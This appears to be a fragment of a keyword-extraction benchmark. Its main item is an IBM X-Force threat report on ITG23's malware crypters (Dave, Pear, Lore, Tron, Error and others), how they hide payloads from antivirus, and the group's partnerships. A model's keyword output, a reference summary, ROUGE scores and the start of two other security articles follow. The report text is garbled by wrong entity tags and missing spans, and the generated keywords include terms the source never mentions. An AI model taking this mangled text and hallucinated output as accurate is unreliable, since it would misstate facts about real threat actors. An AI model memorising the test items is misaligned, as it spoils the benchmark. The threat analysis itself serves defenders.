and from [PERSON] Leo . [PERSON] Reshaev is a developer / manager for the [PERSON] Conti ransomware . Stern : \u043a\u0430\u043a \u0430\u0432\u0442\u043e\u0431\u0438\u043b\u0434\u044b \u0440\u0430\u0431\u043e\u0442\u0430\u044e\u0442 ? Bentley : \u0411\u043e\u043b\u044c\u0448\u0430\u044f \u0447\u0430\u0441\u0442\u044c \u0441\u0442\u0430\u0431\u043e\u0432 \u0443\u0436\u0435 \u0440\u0430\u0431\u043e\u0442\u0430\u044e\u0442 . \u0412\u044b\u0434\u0430\u0435\u043c \u043b\u043e\u043a\u0435\u0440\u044b \u0435\u0445\u0435 [DATE] 32 [DATE] 64 \u0434\u043b\u043b [DATE] 32 [DATE] 64 , \u043a\u043e\u0431\u0443 [DATE] 32 [DATE] 64 \u043a\u0430\u043a \u0435\u0445\u0435 \u0442\u0430\u043a \u0438 \u0434\u043b\u043b . \u0428\u0435\u043b\u043a\u043e\u0434\u044b \u0432 \u0435\u0445\u0435 \u0438 \u0434\u043b\u043b . \u041f\u0440\u043e\u0441\u0442\u044b\u0435 \u0434\u043b\u043b , \u0411\u041a . Stern : \u043a\u0430\u043a\u0438\u0435 \u043b\u043e\u043a\u0435\u0440\u044b [ORG] Bentley : \u043e\u0442 \u0440\u0435\u0448\u0430\u0435\u0432\u0430 \u0432 \u0435\u0445\u0435 \u0438 \u043e\u0442 \u043b\u0435\u043e \u0432 \u0434\u043b\u043b Stern : How 's the autobuild working ? Bentley : Most of the stubs are already working . We issue lockers exe [CARDINAL] 32 [CARDINAL] 64 dll [DATE] 32 [DATE] 64 , cobalt [DATE] 32 [DATE] 64 as exe and dll . [PERSON] Shellcode in exe and dll . [PERSON] Simple [PERSON] Dll , [ORG] BK . Stern : Which lockers ? Bentley : From Reshaev in exe and from [PERSON] Leo in DllAnalysis of IcedID and [PRODUCT] MountLocker samples reveals areas of code overlap , particularly in the logging and decryption functions . Both IcedID and [ORG] MountLocker generate extensive debug logs , which are formatted in an almost identical manner . Figure [CARDINAL] 1 \u2014 Debug log strings from an IcedID sample6/19Figure 2 \u2014 Debug log strings from a [ORG] MountLocker sampleAdditionally , samples of both IcedID and [ORG] MountLocker were identified which contained almost identical XOR decryption and key generation algorithms . Figure [CARDINAL] 3 \u2014 XOR algorithm and key generation function from an IcedID sample7/19Figure 4 \u2014 XOR algorithm and key generation function from a [PRODUCT] MountLocker sampleQakbot : A [LOC] New [LOC] Partner?While monitoring for signs of ITG23 crypters \u2019 use in the wild , X [ORG] - [ORG] Force identified the [ORDINAL] first known use in [DATE] late [DATE] February [DATE] 2022 of an ITG23 crypter with [PERSON] Qakbot aka [PERSON] Qbot . The [PERSON] Qakbot banking trojan was [ORDINAL] first identified in [DATE] 2007 and like other banking trojan groups , it has increased its functionality over [DATE] the [DATE] years and evolved into a flexible downloader and backdoor often leading to ransomware attacks . The appearance of ITG23 crypters on [PERSON] Qakbot samples provides evidence of a direct relationship between [GPE] ITG23 and the [PERSON] Qakbot group . The relationship between [GPE] ITG23 and [PERSON] Qakbot is also supported by additional evidence published recently . That said , the discovery does not come as a complete surprise . In the leaked chats , \u201c [WORK_OF_ART] Tramp \u201d asked [ORG] Bentley on [DATE] December [DATE] 6 , [DATE] 2021 , about crypting [PERSON] Qakbot : Tramp \u2192 Bentley : \u043a\u0440\u0438\u043f\u0442\u0430\u043d\u0435\u043c \u043a\u0432\u0430\u043a \u0431\u043e\u0442\u0430 ? ( crypt Quak Bot ? ) Bentley \u2192 Tramp : \u0434\u0430\u0432\u0430\u0439 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0435\u043c ( let 's try)Tramp later sends [ORG] Bentley a file named stager_1_tr.dll to be crypted . Tramp may be affiliated with \u201c TR \u201d , a prominent distribution affiliate also known as TA577 and which is currently distributing [PERSON] Qakbot . We have since identified [GPE] ITG23 crypters used with [PERSON] Qakbot samples delivered by the [CARDINAL] two most prominent and current [PERSON] Qakbot distribution affiliates \u2014 [PRODUCT] TA570 and TA577 \u2014 suggesting that ITG23 is assisting the [PERSON] Qakbot group with crypting its malware and not just a single distribution affiliate . There is also evidence that [PERSON] Qakbot has a relationship with the [PERSON] Emotet group , dating back [DATE] several [DATE] years . [PERSON] Emotet has historically been used to download [PERSON] Qakbot in addition to [ORG] Trickbot , for example during [DATE] 2020 and then more recently in [DATE] March [DATE] 2022 . Given ITG23 \u2019s partnership with [PERSON] Emotet , it is possible that the [PERSON] Emotet group is facilitating ITG23 \u2019s relationship with [PERSON] Qakbot leading to the latter \u2019s use of an ITG23 crypter . Hive0106 ( [PRODUCT] TA551 ) Gozi SampleX - Force researchers also found a [PERSON] Gozi sample using an ITG23 crypter on [DATE] April [DATE] 7 , [DATE] 2022 ( see below ) . [PERSON] Gozi is also a banking trojan [ORDINAL] first appearing in [DATE] 2007 that has evolved into a multi - module , multi - purpose malware . However , unlike the other banking trojans discussed so far , the Gozi source code has leaked and the malware is not operated or developed by a single group . The threat actor [PERSON] Hive0106 ( aka [PRODUCT] TA551 ) was likely responsible for this campaign delivering [PERSON] Gozi . We assess that [ORG] Bentley and his team likely crypted this [PERSON] Gozi sample on behalf of this group , with which they have an established relationship . The [ORG] CryptersCrypters are applications designed to encrypt and obfuscate malware to protect it from anti - virus scanners and malware analysts . The crypting process generally involves encrypting a pre - compiled malware payload , such as an8/19EXE , [ORG] DLL file , or shellcode , and embedding it within a secondary binary , known as a \u2018 stub \u2019 , which contains code to decrypt and execute the malicious payload . The stubs generally take the form of binaries , such as Exe or [ORG] DLL files , are often either polymorphic or updated frequently in order to evade signature - based detection methods , and usually make use of code obfuscation techniques . When the crypted binary is executed , the stub code will extract the embedded payload , decrypt it , load it into memory and execute it . As a result of this behavior , the crypted binary containing the stub code may also be referred to as a \u2018 loader \u2019 or \u2018 in - memory dropper\u2019 . In order to protect their payloads many crypters may also include additional functionality to detect sandbox environments , hinder AV scanners , escalate privileges , or perform other basic system checks . It \u2019s common for crypters to utilize a high level of code obfuscation within the stubs , and the majority also employ polymorphic techniques such as metaprogramming to ensure that each crypted binary is unique and thus make it harder to identify via signature - based detection methods . Another common technique is for the crypter to disguise the malware as a benign executable , and to this end , they will often use source code from legitimate applications as a template for the stub binary , or include strings or functions which mimic benign activity . The code to decrypt and load the payload will be made as inconspicuous as possible in an effort to hide it from the attention of malware scanners . All of these techniques together also provide obstacles for the malware reverse engineer and make it harder to write detection signatures and automated malware parsers . X [ORG] - [ORG] Force research indicates that ITG23 is providing crypting services to other threat actors in addition to using them for their own malware . Using the same crypter for multiple malware families has an additional benefit of confusing the identification capabilities of AV applications . Indeed , it is not uncommon to see a crypted malware binary flagged by AV as belonging to [CARDINAL] one malware family , when it is in fact a completely different one , and they just happen to be using the same crypter . X [PERSON] - [PERSON] Force analysts are tracking [CARDINAL] at [CARDINAL] least [CARDINAL] thirteen crypters we believe to be developed and currently in use by ITG23 that we are calling Dave , Pear , Lore , Mirror , Galore , Rustic , [ORG] Tron , [ORG] Hexa , [ORG] Stub , [ORG] Error , [GPE] Skeleton , [GPE] Charm , and [PERSON] Graven . Whilst variants of the [PERSON] Dave [PERSON] RC4 crypter have been in use for [DATE] at [DATE] least [DATE] a [DATE] couple [DATE] of [DATE] years , the rest appear to have been primarily developed in [DATE] the [DATE] past [DATE] year . ITG23 has used these crypters with [ORG] Trickbot , [ORG] BazarLoader and [PERSON] Conti malware \u2014 all of which are attributed to ITG23 \u2014 and used them to crypt malware on behalf of groups such as IcedID and Emotet . We have also observed these crypters used with Cobalt Strike samples , which we assess are used by ransomware internal red teams or affiliates when conducting attacks on clients infected with [PERSON] Trickbot , [ORG] BazarLoader , IcedID or Emotet . In the sections below , we provide an overview of each of the crypters and the examples of the malware families they have been used with . [ORG] DaveDave is one of the older crypters that X [ORG] - [ORG] Force tracks as currently in use by ITG23 , having been used since [DATE] at [DATE] least [DATE] 2020 . Several variations of [NORP] Dave exist , but [CARDINAL] one of the most common variants stores the payload either as an [ORG] RCData type resource or within the data section , and decrypts it using a custom RC4 algorithm , which uses a variable sbox size rather than the standard for RC4 which is [CARDINAL] 256 bytes . [PERSON] Dave is so - called as it commonly wraps the payload in a [ORDINAL] second - stage shellcode loader , where the ascii string \u2018 dave \u2019 is used to mark the end of the payload . [PERSON] Dave loaders have been most frequently observed loading [PERSON] Emotet and [PERSON] Trickbot , but also occasionally [ORG] BazarLoader , [ORG] Ryuk , [PERSON] Conti , IcedID , Cobalt Strike and Colibri . It is common practice for malware developers to \u2018 strip \u2019 malware binaries during compilation which removes symbol information such as variable and function names . This has the benefits of making the malware more difficult to analyze , as well as removing details , which may potentially be used by analysts to fingerprint the developer . Almost all samples analyzed by X [ORG] - [ORG] Force are fully stripped , however from [DATE] November [DATE] 2021 [DATE] to January 2022 X [ORG] - [ORG] Force observed a number of unstripped [PERSON] Dave [PERSON] - crypted samples uploaded to repositories such as [ORG] VirusTotal , providing a rare9/19insight into the coding style of the developer . Based off some of the strings and function names X [PERSON] - Forced determined the developer utilized components of publicly available code for the stub , for example , the function CLoad::FromMemory ( ) can be traced back to a [DATE] 2016 code sample , memlib.cpp , originally published on a forum . The aforementioned shellcode with the \u2018 dave \u2019 signature also appears to be modified from the open source sRDI repository . Figure [CARDINAL] 5 \u2014 [ORG] Unstripped [ORG] Dave stub with original function and variable names as assigned by the developer . Select samples using the [PERSON] Dave crypter : [PERSON] Sample [PERSON] Family [PERSON] SHA256 [PERSON] Hash observed in use with IcedID payloads , but samples loading [ORG] BazarLoader , [PERSON] Trickbot , and [GPE] Colibri payloads have also been found . Pear crypter stores the payload within [CARDINAL] one of the stub binary \u2019s data sections , and custom algorithms are used to encrypt the payload . The exact format and values of the encryption algorithm change per sample , suggesting a technique such as metaprogramming may have been employed to generate the algorithms . The encrypted payload often has a recognizable alternating byte pattern that makes use of a restricted set of bytes in order to keep the entropy low . Entropy measures the level of randomness in the data , and many encryption algorithms will generate encrypted data with a distinctively high entropy value , which is easily detectable by binary analysis tools . By using an algorithm that outputs lower - entropy data , the encrypted payload is less easy to detect by automated systems . Figure [CARDINAL] 6 \u2014 Pear crypted sample with distinctive encrypted payload utilizing a restricted byte set . Select samples using the Pear crypter : [PERSON] Sample [PERSON] Family [PERSON] SHA256 [PERSON] Hash [PERSON] Trickbot , [ORG] BazarLoader , IcedID and Cobalt Strike . This crypter stores the payload as a [GPE] BITMAP type resource , with a 103 [QUANTITY] - byte bitmap file header added to the start of the payload data . Upon execution , the stub code loads the resource , removes the bitmap header , and decrypts the remaining data using [ORG] XOR and a hardcoded key . The payload is then loaded into memory and executed . The crypter originally appeared to be designed for use with [ORG] PE payloads , and so shellcode - based payloads were wrapped in an additional [ORDINAL] second stage loader . Lore crypted binaries often include a lot of extraneous imports and junk functions in an attempt to obscure the location of the payload decryption and loading code from analysts . This loading code instead uses API hashes to11/19retrieve handles to the API functions it requires , so the extraneous imports can generally be ignored by the analyst . A handful of Lore crypted samples were identified containing the following [ORG] PDB paths : c:\\jenkins\\workspace\\crypter5_generic_exe\\Bin\\x64\\Release\\MFC_Stub.pdb c:\\jenkins\\workspace\\crypter5_shellcode_64_exe\\Bin\\x64\\Release\\MFC_Stub.pdb c:\\jenkins\\workspace\\crypter5_generic_exe\\Bin\\x86\\Release\\MFC_Stub.pdb c:\\jenkins\\workspace\\crypter5_shellcode_64_exe\\Bin\\x64\\Release\\MFC_Stub.pdbThese paths provide evidence of a Jenkins server being used for crypting operations and also suggest that it likely contains a number of different crypters , with crypter5 being Lore Crypter . This is corroborated by the [ORG] PDB path found within some Error crypted samples , detailed further below , which refer to it as \u2018 crypter7\u2019 . The directory names \u2018 crypter5_generic_exe \u2019 and \u2018 crypter5_shellcode_64_exe \u2019 indicate that different configurations of the crypter stubs were likely compiled for different types of payloads . In this case , the [CARDINAL] two samples containing the reference \u2018 crypter5_shellcode_64_exe \u2019 are both [CARDINAL] 64 - bit executable files that contain Cobalt Strike shellcode http stagers as their payloads . For the [CARDINAL] two samples containing the reference \u2018 crypter5_generic_exe \u2019 , one is a [CARDINAL] 64 - bit executable containing a [PRODUCT] BazarLoader payload and the other is a [CARDINAL] 32 - bit executable containing a [PERSON] Conti ransomware executable . Select samples using the Lore crypter : [PERSON] Sample [PERSON] Family SHA256 Hash payloads , as well as some IcedID and Cobalt Strike . Mirror crypter shares some code overlap and obfuscation mechanisms with Lore crypter , suggesting they may have the same developer or codebase . Mirror splits its encrypted payload into [CARDINAL] three parts which are stored across different sections of the resulting binary loader . [CARDINAL] Two main variants of the [ORG] Mirror stub code have been found so far , one which decrypts the payload using AES-256 via the [PRODUCT] Windows [PRODUCT] CryptDecrypt API , and a second which decrypts the payload using [WORK_OF_ART] XOR and a hardcoded key . Select samples using the [ORG] Mirror crypter : SHA256 HashSample Family with alternative languages , producing crypters with loader stubs written in both the Go and Rust programming12/19languages . Galore crypter uses the Go programming language and has been observed in the wild since [DATE] mid-2021 when it was frequently used to crypt [PRODUCT] BazarLoader payloads . The Go programming language has become increasingly popular with malware authors over [DATE] the [DATE] past [DATE] few [DATE] years due to its convenient cross - platform support , and the fact that it produces large and complex binaries upon compilation which can be tricky to reverse engineer and often have lower detection rates against AV applications than their C / C++ coded counterparts . Upon execution the Galore stub code decrypts the payload using [WORK_OF_ART] XOR , and loads and executes the [ORG] PE payload using code based off the open - source Reflective DLL Injection project . The use of this Reflective Dll Injection code is common in many of ITG23 \u2019s crypters . Select samples using the Galore crypter : [PERSON] Sample [PERSON] Family SHA256 Hash malware developers . The payload is stored in the .rdata section of the loader and encrypted using a XOR based algorithm with [CARDINAL] two keys applied in multiple iterations . The crypter supports both shellcode and [ORG] PE payloads , with shellcode payloads loaded into memory and executed directly , and [ORG] PE payloads loaded in a similar manner to Galore crypter , using [PRODUCT] the [PRODUCT] Reflective [PRODUCT] DLL [PRODUCT] Injection technique . Rustic crypted samples were [ORDINAL] first observed in [DATE] early [DATE] September [DATE] 2021 and it has been used with malware including [PRODUCT] BazarLoader , IcedID , Cobalt Strike , [ORG] Quantum , as well as implants from Sliver which is a post - exploitation framework written in Go.13/19Figure [CARDINAL] 7 \u2014 Rustic stub loader code responsible for loading and decrypting the payloadFigure [CARDINAL] 8 \u2014 Strings within a [ORG] Rustic - crypted sample indicate that the binary was written using the Rust languageSelect samples using the [ORG] Rustic crypter : [PERSON] Sample [PERSON] Family SHA256 Hash gtag [PERSON] rob132 . Since then , it has been observed with payloads within [PERSON] Emotet , [PERSON] Trickbot , [ORG] BazarLoader , IcedID , Conti and Cobalt Strike . Of note , [PERSON] Tron is the crypter identified in this article from [ORG] CERT - [ORG] UA.Tron crypted binaries have their payload usually stored within the .text section of the stub loader which , upon execution , unpacks and decompresses the payload , and then loads it into memory and executes it . The decompression of the payload is performed using the [ORG] Zlib library ; however , the unpacking appears to be performed using code originating from an obscure [GPE] Github project called [PERSON] Megatron ( url specifically a module called ioBuffer.cpp which implements basic buffer manipulation and unpacking functions . The [GPE] Megatron project has since been taken down but previously strings from the source code in [GPE] Github could be observed within the unpacking functions in the crypted binaries . Figure [CARDINAL] 9 \u2014 The source code of ioBuffer.cpp as seen on [ORG] GithubThe above image shows the source code of ioBuffer.cpp as seen on [GPE] Github , specifically a function named [PERSON] inBuffer::get_8 ( ) is shown , which contains the error string \u201c inBuffer::get_8 : noenough \u201c . This same function and error string can be seen within the unpacking functions of the crypted binary.15/19The payload data is split into chunks which are delimited with the bytes \u2018 c3 cc cc cc \u2019 , where the number of \u2018 cc \u2019 bytes varies based on alignment . Bytes used to calculate the size of each chunk are added at the start of each chunk . The unpacking code parses the payload data , calculating the size of each chunk and appending the chunk data to the output buffer whilst checking for and discarding the 0xc3 and 0xcc padding bytes . The compressed and decompressed sizes are then parsed from the start of the unpacked data , and the zlib.decompress function is used to decompress the payload . [CARDINAL] One version of this crypter stores the payload in multiple parts , which are unpacked individually and then joined together before decompression . Several other variants of the [ORG] Tron crypter have also been observed . [CARDINAL] One example contains the same ioBuffer unpacking functions , but the payloads are decrypted using XOR rather than decompressed using [ORG] Zlib . Some variants also have the payload stored in the .data section , and others may encode the payload in a numeric ascii format . Some samples were identified containing path strings for header files such as the following : Z:\\cr4\\ballast\\5\\core\\src\\BitArray.h Z:\\cr\\crypter4\\ballast\\3\\openjp2\\opj_intmath.hConsidering the [ORG] PDB strings identified within Lore and Error crypted samples , these path strings may indicate that [ORG] Tron crypter is referred to as crypter4 within the group . Select samples using the [ORG] Tron crypter : [PERSON] Sample [PERSON] Family SHA256 Hash entropy . This is then stored in the data sections of the stub binary , with some variants splitting the payload across [CARDINAL] two or [CARDINAL] three different sections . Upon execution the payload is reconstructed , decompressed and decrypted and then copied to a newly created memory section and execution transferred to the payload . Portable executable ( [ORG] PE ) payloads may be preceded by a shellcode loader which is responsible for properly mapping the [ORG] PE file into memory and executing it . Hexa makes use of code obfuscation techniques to hinder analysis efforts including splitting the code into many tiny blocks separated by jumps , and the inclusion of blocks of junk data.16/19Hexa crypted samples were observed towards [DATE] the [DATE] end [DATE] of [DATE] 2021 , with payloads including [ORG] BazarLoader , Cobalt Strike , and [PERSON] Conti . It has also seen an increase in usage over [DATE] the [DATE] past [DATE] couple [DATE] of [DATE] months where it has been used with malware families including IcedID , [PERSON] QakBot and [PERSON] Gozi . Select samples using the [WORK_OF_ART] Hexa crypter : [PERSON] Sample [PERSON] Family [PERSON] SHA256 [PERSON] Hash also been identified with payloads such as [ORG] BazarLoader , Cobalt Strike , [PERSON] Conti , and [ORG] Quantum ransomware , which is a variant of [ORG] MountLocker and thought to be associated with the IcedID group . Stub crypter stores the payload across multiple [ORG] RCDATA type resources with sequential ids , e.g. [CARDINAL] 200 , [CARDINAL] 201 , [CARDINAL] 202 . The [ORDINAL] first resource contains the encryption key , and the remaining resources each hold an encrypted section of the payload [ORG] PE file . To generate the encryption key , the malware takes the [ORDINAL] first resource , removes a 62 [QUANTITY] - byte header , and then proceeds to generate each byte of the key by combining the next three bytes from the resource data using bitwise shift and or operations . The final key length is usually [DATE] 1024 bytes . The malware then proceeds to decrypt the next resource using this key and a custom xor - based algorithm , which varies between samples . The [ORDINAL] first decrypted resource contains the [ORG] PE header of the payload binary , and the loading code uses information from this header to map each of the remaining [ORG] PE sections into memory as it decrypts them from the resources . The loaded payload is then executed at its entry point . Select samples using the [PERSON] Stub crypter : [PERSON] Sample [PERSON] Family [PERSON] SHA256 Hash IcedID and [PRODUCT] BazarLoader campaigns , as well as being used with Cobalt Strike payloads . Error crypted binaries contain a large amount of junk code and strings for obfuscation , with one variant seemingly designed to be disguised as a hospital administration tool . Some samples also contain strings , which appear to have been generated from literary texts such as \u2018 David Copperfield\u2019.17/19Figure [CARDINAL] 10 \u2014 Error crypted sample containing strings relating to a hospital administration applicationError crypter encrypts its payload using [WORK_OF_ART] XOR and the encrypted payload is divided into small chunks which are scrambled up and stored . Upon execution , the stub code uses a complicated series of functions to retrieve the data chunks and reconstruct the encrypted payload . The XOR key required for decryption is generated in a similarly convoluted manner , with data being decrypted and retrieved from various sources and concatenated to form a string . This string is then hashed , and the hash is used to generate the final [LAW] XOR [LAW] key . An example of [CARDINAL] one of the strings used to generate the XOR decryption key is as follows : [DATE] 2021 [DATE] - 12 - 03- mok.35022336.17:33:40===700524802745472.xKUzpAWUHQuKEHhnAwJ4MEDN4oDSNpNqXpt.2691200820897.3Error crypter also includes some anti - debugging functions within the stub code including checking for the presence of a debugger and checking the system time year against a hard coded value . Some Error crypted samples were found to contain the following [ORG] PDB string : C:\\\\crypter7\\\\Bin\\\\x64\\\\Release\\\\Dll\\\\cryptERRDll.pdbThis [ORG] PDB string suggests that this crypter may have been known as \u2018 crypter7 \u2019 or \u2018 cryptERR \u2019 internally within ITG23.Select samples using the Error crypter : [PERSON] Sample [PERSON] Family SHA256 Hash loading payloads such as [ORG] BazarLoader , Cobalt Strike , [PERSON] Conti , and [ORG] MountLocker . Charm crypter compresses its payload using an arithmetic coding algorithm , and then xor encrypts the compressed data and splits it into many small segments which are stored throughout the loader binary . [ORG] Charm crypted binaries are obfuscated using junk code to hinder analysis.18/19Select samples using the [EVENT] Charm crypter : [PERSON] Sample [PERSON] Family [PERSON] SHA256 Hash Each part is then split into small pseudo - randomly sized chunks , delimited with pseudo - randomly sized chunks of null bytes . The algorithm to determine both the size of payload chunks and null - byte chunks is deterministic with a fixed seed allowing for the payload to be reconstructed by the loader . Upon execution , the payload is rebuilt and decrypted using [ORG] AES , then loaded into memory and executed . Some variants of [PERSON] Graven also include code to create a mutex [ORG] BazarLoader , [PERSON] Emotet , and IcedID.Select samples using the [PERSON] Graven crypter : [PERSON] Sample [PERSON] Family [PERSON] SHA256 Hash the loader binary , often with just a hardcoded ascii string used as the XOR key . Upon execution , the payload resource is loaded , decrypted , and executed in memory . Variants have been found loading either shellcode or [ORG] PE formatted payloads . PE payloads are mapped into memory , imports loaded , and then executed from their entrypoint . [PERSON] Skeleton crypted binaries have been observed loading [PERSON] Trickbot , Cobalt Strike and IcedID payloads [DATE] between [DATE] December [DATE] 2021 and late March 2022.Select samples using the [PERSON] Skeleton crypter : [PERSON] Sample [PERSON] Family [PERSON] SHA256 Hash", "generated_text": "research; IBM Security X-Force; use; several crypters; the cybercriminal group ITG23; Wizard Spider; DEV-0193; the Trickbot Group; research; 13; crypters; malware; other groups; Trickbot; BazarLoader; Colibri; IcedID; Qakbot; MountLocker; a partnership; ITG23; the threat actors; the development; IcedID ransomware; the collaboration; ATT&CK exploits; collaboration; networks; C2; POST; NAT; compromised servers; infrastructure; the groups; adversaries; the Middle East; time; the group; collaboration; the threat actors; ransomware attacks; analysis.", "ref_text": "<START-1>The cybercriminal group ITG23, which operates malware like Trickbot and BazarLoader, has developed at least 13 different crypters to encrypt and obfuscate malware payloads. These crypters have names like Dave, Pear, Lore, Mirror, and Hexa. ITG23 uses the crypters to protect its own malware like Trickbot, BazarLoader, and Conti ransomware. But it also provides crypting services to other threat actor groups. ITG23 has long-standing relationships with the groups behind Emotet and IcedID banking trojans, and uses its crypters on their malware. In mid-2021, ITG23 set up an automated \"Build Machine\" using the Jenkins platform to scale up their crypting operations. The Build Machine can compile customized stub executables to embed encrypted payloads from various malware families. Analysis of ITG23's crypters reveals the use of obfuscation, polymorphism, anti-debugging, and other techniques to evade security products and analysis. Payloads are encrypted in ways that reduce detectable entropy. Most crypters execute the final payload in-memory after decryption. Leaked ITG23 chat logs provide further insight into their partnerships with groups like Emotet and IcedID. ITG23 also began providing crypting services to the Qakbot banking trojan in late 2021. Links between IcedID and the MountLocker ransomware operation suggest IcedID may be behind MountLocker. Defending against ITG23 requires updated threat intelligence on their latest crypters, malware, and attack tactics. Controls around email, endpoints, access, network segmentation, monitoring, and data protection are necessary to mitigate the risk. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4678899082568807, "gpt3/lexical/rouge_rouge2": 0.1336405529953917, "gpt3/lexical/rouge_rougeL": 0.2201834862385321, "gpt3/lexical/rouge_rougeLsum": 0.2201834862385321, "gpt3_generated_text": ["The article discusses the research conducted by IBM Security X-Force on the use of crypters by the cybercriminal group ITG23, also known as Wizard Spider or the Trickbot Group. Crypters are applications used to encrypt and obfuscate malware to evade antivirus scanners. The study analyzed thirteen crypters that have been used with malware operated by ITG23 and other groups such as Trickbot, BazarLoader, IcedID, and Emotet. The presence of these crypters indicates a partnership between ITG23 and the respective group. The research also found evidence of ITG23 scaling up their crypting operations and using the crypters with other malware such as Qakbot and Gozi banking trojans. Additionally, a relationship was uncovered between the IcedID group and the MountLocker ransomware-as-a-service (RaaS) operation. ITG23 is described as a group of groups that share infrastructure and support functions. The article highlights the collaboration and close relationship between ITG23 and various threat actors involved in ransomware attacks. The research provides insights into the tactics, techniques, and procedures (TTPs) used by these groups and their collaboration through shared networks, compromised servers, and infrastructure. The findings have implications for cybersecurity professionals and organizations in understanding the evolving threat landscape and mitigating ransomware attacks."]}, {"split_name": "test", "sample_id": "test_62", "prompt_text": "Extract the keywords: stisc-gov-md.translate.goog /ro / stisc - atentie - continua - valul - atacurilor - cibernetice - de - tip - scam - si - phishing STISC : BEWARE - the wave of scam and phishing cyberattacks continuesPress release , Awareness , [ORG] Alerts , | 05 - 01 - 2023Postat de ecaterina.grigorean la 5 January 2023January 5 , 2023 , Chisinau - The Information Technology and [ORG] Cyber [ORG] Security [ORG] Service ( STISC ) warns of scam and phishing cyber attack campaigns targeting government institutions . To date , [CARDINAL] more [CARDINAL] than [CARDINAL] 1330 messages have been sent to the e - mail addresses of public institutions . Owners of .md domains are informed by e - mail about the expiration of the domain name 's validity period and are asked to initiate the procedure for extending it , requesting access to a link to make the payment . STISC recommends avoiding accessing such links , as well as blocking , reporting the sender.1/2At the same time , in the context of the continuation of the wave of scam and phishing cyber attacks during [DATE] the [DATE] holidays , we urge you to always check the real source of the message and respect the rules of cyber hygiene . We inform you that phishing is one of the most common cyber attacks , through which criminals on the Internet try to steal money , personal information , banking information , card or account numbers , [ORG] PIN codes , etc . Cybercriminals usually pretend to be reputable companies , friends , or acquaintances and send emails or SMSs that draw attention to technical malfunctions or errors and request re - introduction of personal data or even payment . Scam attacks are an example of payment fraud . Email messages sent by criminals contain true information about the institution and request payments by not following the usual / legal payment authorization procedure , but by accessing a link . We note that cyber attacks can have dire consequences and we urge you to follow the minimum cyber security rules . Photo:2/2", "generated_text": "e-mail; government institutions; 1330; phishing; e-mail; a link; a scam; payment; phishing; the wave; scams; phishing email; hackers; domains; the.md domain; the expiration; the domain name; the procedure; the post; a link; the payment; a link; a link; the payload; the domain.", "ref_text": "<START-1>The document is a press release from the Information Technology and Cyber Security Service (STISC) of Moldova warning about an ongoing wave of phishing and scam cyberattacks targeting government institutions in the country. It states that over 1,330 phishing emails have been sent to public institution email addresses asking the recipients to click on a link to renew expiring domain names and make a payment. STISC advises not clicking on these links or responding to the messages. The press release cautions that phishing remains one of the most common cyberattack techniques, where criminals impersonate trusted entities and try to steal personal information, financial data, account credentials, etc. It notes that scam attacks involve fraudulent payment requests that bypass normal procedures. STISC urges following basic cybersecurity practices like verifying message senders, not opening suspicious attachments or links, and being wary of requests for sensitive information. The press release aims to raise public awareness about the ongoing phishing and scam campaigns to help people identify and avoid falling victim to them. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.576271186440678, "gpt3/lexical/rouge_rouge2": 0.19112627986348124, "gpt3/lexical/rouge_rougeL": 0.30508474576271183, "gpt3/lexical/rouge_rougeLsum": 0.30508474576271183, "gpt3_generated_text": ["The Information Technology and Cyber Security Service (STISC) has issued a warning about a wave of scam and phishing cyberattacks targeting government institutions. Over 1330 messages have been sent to the e-mail addresses of public institutions, with hackers posing as legitimate entities and requesting payment or personal information. The perpetrators use e-mail messages containing accurate information about the institution and a link for payment, bypassing the usual authorization procedure. STISC advises against accessing such links and urges the public to be cautious and verify the source of any message, as well as to follow cyber hygiene practices to prevent falling victim to phishing attacks. It is important to be aware of the risks and to report any suspicious activity to avoid dire consequences."]}, {"split_name": "test", "sample_id": "test_63", "prompt_text": "Extract the keywords: [ORG] Explosive [ORG] New [ORG] MirrorBlast [ORG] Campaign [ORG] Targets [ORG] Financial [ORG] Companiesblog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companiesKey [ORG] Points : [PERSON] Morphisec [PERSON] Labs tracked a new [ORG] MirrorBlast campaign targeting financial services organizations [ORG] MirrorBlast is delivered via a phishing email that contains malicious links which download a weaponized [PRODUCT] Excel document [ORG] MirrorBlast has low detections on [ORG] VirusTotal due to the extremely lightweight macro embedded in its [PRODUCT] Excel files , making it particularly dangerous for organizations that depend on detection - based security and sandboxingIntroductionFinancial organizations are historically among the most targeted by threat actors . There are many reasons for this , not least of which is the trove of customer data the financial sector holds , as well as the funds to pay large sums of money to regain access to encrypted data . The [ORG] Morphisec [ORG] Labs team has tracked a new version of a campaign targeting financial organizations . Dubbed \u201c MirrorBlast \u201d by [PERSON] ET [PERSON] Labs , the current attack campaign the [NORP] Labs team has tracked began in [DATE] early [DATE] September . There was similar activity in [DATE] April [DATE] 2021 as well , but the current campaign began more recently . The attack chain of the infection bears a similarity to the tactics , techniques , and procedures commonly used by the allegedly [GPE] Russia - based threat group TA505 . The similarities extend to the attack chain , the [ORG] GetandGo functionality , the final payload , and similarities in the domain name pattern . TA505 has been active since [DATE] at [DATE] least [DATE] 2014 and , as far as analysts can ascertain , has a financial motivation for their actions . As a group , TA505 is most known for frequently changing the malware they use as well as driving global trends in malware distribution . In this blog post , we will examine the new attack chain of the [ORG] MirrorBlast campaign , from the initial delivery of a malicious [PRODUCT] Excel file to the end result of loading an additional payload.1/9Figure [CARDINAL] 1 : The attack chain of [ORG] MirrorBlastTechnical introductionIn [DATE] September we observed a malspam campaign delivering [PRODUCT] Excel documents as an attachment . This campaign targets multiple sectors from [GPE] Canada , [GPE] the [GPE] United [GPE] States , [GPE] Hong [GPE] Kong , [LOC] Europe , and more . The attack chain starts with an email attachment document , but at a later stage , it changes to use the Google feedproxy URL with [ORG] SharePoint and [ORG] OneDrive lure , which poses as a file share request . These URLs lead to a compromised [ORG] SharePoint or a fake [ORG] OneDrive site that the attackers use to evade detection , in addition to a sign - in requirement ( [ORG] SharePoint ) that helps to evade sandboxes . Figure [CARDINAL] 2 : A phishing email with the [ORG] SharePoint lure theme . Figure [CARDINAL] 3 : A fake [ORG] OneDrive website serving an [PRODUCT] Excel document ( in German).Excel [WORK_OF_ART] DocumentThe [WORK_OF_ART] Excel document is weaponized with an extremely lightweight macro code . Figure [CARDINAL] 4 : A totally [PRODUCT] FUD [PRODUCT] Excel document.2/9The macro code can be executed only on a 32 - bit version of Office due to compatibility reasons with ActiveX objects ( ActiveX control compatibility ) . The macro code performs anti sandboxing by checking if the following 